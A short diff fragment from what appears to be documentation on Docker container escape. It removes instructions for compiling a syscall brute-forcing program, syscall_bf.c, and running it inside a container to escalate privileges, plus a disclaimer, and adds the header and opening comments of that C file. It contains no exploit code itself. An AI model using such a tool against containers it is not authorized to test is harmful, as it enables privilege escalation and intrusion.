-Compile the `syscall_bf.c` code on the host system using a C compiler. Run the compiled binary inside the Docker container to escalate privileges.
-
-### Disclaimer
-
-This exploit is for educational purposes only. Misuse of this exploit on systems without authorization is illegal.
+{% tab title="syscall_bf.c" %}
 ````c
 // From a conversation I had with @arget131
 // Fir bfing syscalss in x64
